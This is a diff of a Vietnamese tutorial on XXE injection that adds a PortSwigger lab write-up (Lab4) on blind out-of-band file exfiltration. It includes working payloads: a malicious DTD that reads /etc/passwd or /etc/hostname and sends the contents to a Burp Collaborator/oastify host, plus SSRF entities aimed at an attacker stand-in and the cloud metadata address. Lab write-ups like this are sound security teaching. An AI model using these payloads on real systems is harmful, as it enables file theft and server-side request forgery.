@@ -66,7 +66,7 @@ Các loại hình tấn công XXE:
 ## 4. Exploiting XXE to retrieve files
 Dạng tấn công này ta sẽ dùng XXE để đọc 1 file bất kỳ của sever
 
-Ví dụ : Lab1 XXE injection portswigger
+#### Ví dụ : Lab1 XXE injection portswigger
 
 Lab cho ta một trang web check số lượng của một mặt hàng nào đó. Khi chọn 1 mặt hàng và check số lượng, ta bắt được request là một tài liệu XML
 
@@ -97,7 +97,7 @@ Ta dùng câu khai báo sau để thực hiện request tới website kha�
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker-website.com"> ]>
 ```
 
-Ví dụ : Lab2 XXE injection portswigger
+#### Ví dụ : Lab2 XXE injection portswigger
 
 Ở lab này vẫn là trang check số lượng hàng, nhưng web yêu cầu ta gửi request đến ``http://169.254.169.254/`` và sẽ nhận về dữ liệu về các instance
 
@@ -124,9 +124,9 @@ Tương tự như blind SQLi thì blind XXE xảy ra khi ứng dụng không 
 ### A. Blind XXE out-of-band
 Đây là kỹ thuật mà ta sẽ inject payload sao cho target gửi request đến web mà ta kiểm soát. Cách triển khai thì tương tự như ``XXE SSRF attack``
 
-Ví dụ : Lab3 XXE injection portswigger
+#### Ví dụ : Lab3 XXE injection portswigger
 
-Lab này vẫn là 1 trang check stock, và yêu cầu của nó là thực hiện XML sao cho labs phải gửi request đến Burp Collaborator của mình\
+Lab này vẫn là 1 trang check stock, và yêu cầu của nó là thực hiện XXE sao cho labs phải gửi request đến Burp Collaborator của mình\
 Ta dùng dòng sau để inject:
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
@@ -147,5 +147,52 @@ Payload:
 Khi inject thành công thì Burp Collborator sẽ bắt được request:
 
 ![lab3](./img/lab3.png)
+
+#### Ví dụ: Lab4 XXE injection portswigger
+Ở ví dụ này thì mình dùng Blind XXE out-of-band để đọc một file bất kỳ trên sever
+
+Trước tiên ta cần tìm hiểu về cách dùng kỹ thuật out-of-band để đọc file bất kỳ trên sever, các bước thực hiện sẽ bao gồm
+1. Khai báo một file DTD có nhiệm vụ là đọc 1 file và gửi nội dung file đó cho Burp Collaborator
+2. Thực hiện XXE out-of-band đến file DTD trên
+
+File DTD sẽ được khai báo như sau:
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+%eval;
+%exfil;
+```
+> Trong đó: 
+>>1. entity ``file`` được dùng để đọc file bất kỳ
+>>2. entity ``eval`` sẽ chứa một khai báo động đến ``exfil``
+>>3. ``exif`` sẽ gửi request đến Burp Collaborator kèm theo nội dung của file
+>>3. Ngoài ra thì payload trên sử dụng ``%`` để khai báo entity. Cách khai báo này gọi là ``Parameterized 
+>>4. Phần mã hex ``&#x25`` là mã hex của ký tự ``%``, ta dùng mã hex đơn giản là để bypass thôi
+
+Bước tiếp theo trong tài liệu XML của web thì ta inject thêm đoạn sau để thực hiện SSRF tới file DTD của ta:
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+```
+
+Quay trở lại với Labs, thì vẫn là trang check stock quen thuộc và đề bài yêu cầu ta đọc file /etc/hostname.
+
+Đầu tiên ta khai báo file DTD với nội dung sau:
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://8z8oco3dqgxm3ziloo75ta2xxo3ir7.oastify.com/?x=%file;'>">
+%eval;
+%exfil;
+```
+Tại tài liệu XML của web ta thực hiện SSRF tới file DTD trên:
+
+![lab4](./img/lab4-burp.png)
+
+Sau khi gửi đi paylaod thì tại Burp Collaborator ta sẽ nhận được request:
+
+![lab4](./img/burp4-solved.png)
+
+Cuối cùng submit nội dung file hostname và solved lab
+
+
 
 
